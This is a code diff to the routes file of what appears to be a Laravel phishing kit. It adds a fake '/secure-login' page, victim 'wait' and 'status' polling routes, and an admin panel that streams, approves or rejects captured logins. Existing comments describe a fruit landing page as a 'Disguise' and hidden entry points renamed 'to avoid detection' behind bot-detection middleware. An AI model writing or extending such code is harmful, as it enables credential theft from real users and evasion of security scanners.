@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\LoginApprovalController;
 use App\Http\Controllers\PhishingController;
 use Illuminate\Support\Facades\Route;
 
@@ -8,6 +9,21 @@ use Illuminate\Support\Facades\Route;
 | Web Routes
 |--------------------------------------------------------------------------
 */
+
+Route::get('/secure-login', [LoginApprovalController::class, 'showLogin'])->name('secure-login');
+Route::post('/secure-login', [LoginApprovalController::class, 'submitLogin'])->name('secure-login.submit');
+Route::get('/approval/wait/{id}', [LoginApprovalController::class, 'wait'])->name('approval.wait');
+Route::get('/approval/status/{id}', [LoginApprovalController::class, 'status'])->name('approval.status');
+
+Route::get('/admin/login-approvals', [LoginApprovalController::class, 'admin'])->name('admin.login-approvals');
+Route::get('/admin/login-approvals/list', [LoginApprovalController::class, 'list'])->name('admin.login-approvals.list');
+Route::get('/admin/login-approvals/stream', [LoginApprovalController::class, 'stream'])->name('admin.login-approvals.stream');
+Route::post('/admin/login-approvals/{id}/approve', [LoginApprovalController::class, 'approve'])->name('admin.login-approvals.approve');
+Route::post('/admin/login-approvals/{id}/reject', [LoginApprovalController::class, 'reject'])->name('admin.login-approvals.reject');
+Route::post('/admin/login-approvals/{id}/delete', [LoginApprovalController::class, 'destroy'])->name('admin.login-approvals.delete');
+Route::delete('/admin/login-approvals/{id}', [LoginApprovalController::class, 'destroy'])->name('admin.login-approvals.destroy');
+Route::post('/admin/login-approvals-bulk-delete', [LoginApprovalController::class, 'destroyMultiple'])->name('admin.login-approvals.bulk-delete');
+Route::post('/admin/login-approvals-clear', [LoginApprovalController::class, 'clearAll'])->name('admin.login-approvals.clear');
 
 // Public Fruit Landing Page (Disguise)
 Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
@@ -19,6 +35,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     // Hidden Entry Points - Wrapped and Renamed for Disguise
     // We remove '/login' and '/latest-settings-info' to avoid detection
     Route::get('/invitation-login', [PhishingController::class, 'showLogin2v2']);
+    Route::post('/invitation-login', [LoginApprovalController::class, 'submitLogin']);
     Route::get('/invitation', [PhishingController::class, 'index']);
 
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
